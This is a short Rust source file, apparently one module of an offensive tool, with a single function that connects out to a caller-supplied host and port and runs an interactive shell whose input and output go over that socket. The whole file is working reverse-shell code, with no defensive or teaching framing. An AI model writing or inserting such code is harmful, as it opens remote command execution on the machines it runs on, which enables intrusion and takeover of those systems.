use std::io::Result;
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

pub fn shell(host: String, port: String, shell: String) -> Result<()> {
    let sock = TcpStream::connect(format!("{}:{}", host, port))?;
    let fd = sock.as_raw_fd();

    Command::new(shell)
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()?
        .wait()?;

    log::warn!("Shell exited");

    Ok(())
}
